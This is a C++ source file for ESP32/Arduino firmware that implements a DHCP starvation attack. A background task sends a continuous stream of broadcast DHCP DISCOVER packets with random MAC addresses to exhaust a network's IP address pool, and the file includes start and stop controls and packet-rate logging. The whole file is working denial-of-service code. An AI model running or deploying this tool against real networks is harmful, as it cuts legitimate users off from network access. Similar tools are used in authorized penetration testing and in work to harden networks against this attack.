/**
 * @file dhcp_starvation.cpp
 * @brief DHCP starvation attack implementation
 */

#include "dhcp_starvation.h"
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

extern "C" {

static volatile bool dhcp_starve_running = false;
static volatile uint32_t dhcp_starve_packets_sent = 0;
static TaskHandle_t dhcp_starve_task_handle = NULL;

#pragma pack(push, 1)
typedef struct {
  uint8_t op, htype, hlen, hops;
  uint32_t xid;
  uint16_t secs, flags;
  uint32_t ciaddr, yiaddr, siaddr, giaddr;
  uint8_t chaddr[16];
  uint8_t sname[64];
  uint8_t file[128];
  uint8_t options[312];
} dhcp_packet_t;
#pragma pack(pop)

static void dhcp_starve_task(void *param) {
  (void)param;
  TickType_t last_log_tick = xTaskGetTickCount();
  uint32_t last_log_total = 0;
  int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if (sock < 0) {
    Serial.println("DHCP-Starve: failed to create socket");
    dhcp_starve_running = false;
    dhcp_starve_task_handle = NULL;
    vTaskDelete(NULL);
    return;
  }

  int broadcast = 1;
  if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) != 0) {
    Serial.println("DHCP-Starve: failed to configure broadcast socket");
    close(sock);
    dhcp_starve_running = false;
    dhcp_starve_task_handle = NULL;
    vTaskDelete(NULL);
    return;
  }
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(67);
  addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);

  while (dhcp_starve_running) {
    dhcp_packet_t pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.op = 1;
    pkt.htype = 1;
    pkt.hlen = 6;
    pkt.xid = esp_random();
    pkt.flags = htons(0x8000);
    esp_fill_random(pkt.chaddr, 6);
    pkt.chaddr[0] &= 0xFE;
    pkt.chaddr[0] |= 0x02;
    pkt.options[0] = 99;
    pkt.options[1] = 130;
    pkt.options[2] = 83;
    pkt.options[3] = 99;
    pkt.options[4] = 53;
    pkt.options[5] = 1;
    pkt.options[6] = 1;
    pkt.options[7] = 255;
    ssize_t sent = sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr, sizeof(addr));
    if (sent < 0) {
      Serial.println("DHCP-Starve: send failed, stopping attack");
      dhcp_starve_running = false;
      break;
    }
    dhcp_starve_packets_sent++;

    TickType_t now = xTaskGetTickCount();
    if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
      uint32_t total = dhcp_starve_packets_sent;
      uint32_t interval = total - last_log_total;
      last_log_total = total;
      last_log_tick = now;
      uint32_t pps = interval / 5;
      Serial.printf("DHCP-Starve: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
    }

    vTaskDelay(pdMS_TO_TICKS(10));
  }
  close(sock);
  dhcp_starve_task_handle = NULL;
  vTaskDelete(NULL);
}

void dhcp_starvation_start(int threads) {
  if (WiFi.status() != WL_CONNECTED) {
    Serial.println("Not connected to an AP");
    return;
  }

  if (dhcp_starve_running) {
    Serial.println("DHCP starvation already running");
    return;
  }

  Serial.println("[DHCP] start called");
  Serial.println("[DHCP] creating task");
  Serial.println("Starting DHCP starvation attack...");
  dhcp_starve_running = true;
  dhcp_starve_packets_sent = 0;
  (void)threads;

  BaseType_t attack_rc = xTaskCreate(dhcp_starve_task, "dhcp_starve", 4096, NULL, 5, &dhcp_starve_task_handle);
  if (attack_rc != pdPASS) {
    Serial.printf("Failed to start DHCP starvation task (%ld)\n", (long)attack_rc);
    dhcp_starve_running = false;
    dhcp_starve_task_handle = NULL;
  }
  Serial.println("[DHCP] task created");
}

void dhcp_starvation_stop(void) {
  if (!dhcp_starve_running) {
    return;
  }
  Serial.printf("DHCP-Starve stopped. Total: %lu packets\n", (unsigned long)dhcp_starve_packets_sent);
  dhcp_starve_running = false;

  int wait_count = 0;
  while (dhcp_starve_task_handle != NULL && wait_count < 20) {
    vTaskDelay(pdMS_TO_TICKS(100));
    wait_count++;
  }
}

void dhcp_starvation_display(void) {
  Serial.printf("DHCP-Starve: Total: %lu packets\n", (unsigned long)dhcp_starve_packets_sent);
}

void dhcp_starvation_help(void) {
  Serial.println("DHCP Starvation Attack - Floods DHCP server to exhaust IP pool");
}

bool dhcp_starvation_is_running(void) {
  return dhcp_starve_running;
}

} // extern "C"
